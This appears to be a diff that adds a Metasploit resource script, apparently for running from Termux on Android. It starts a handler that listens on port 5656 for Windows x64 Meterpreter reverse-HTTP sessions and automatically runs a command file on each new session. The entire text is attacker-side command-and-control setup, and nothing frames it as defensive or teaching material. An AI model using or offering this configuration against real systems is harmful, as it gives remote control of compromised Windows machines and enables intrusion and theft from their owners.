@@ -1,0 +1,6 @@
+use multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_http
+set LHOST 0.0.0.0
+set LPORT 5656
+set AutoRunScript multi_console_command -r /data/data/com.termux/files/home/msf/autocommandmeterpreter.rc
+run
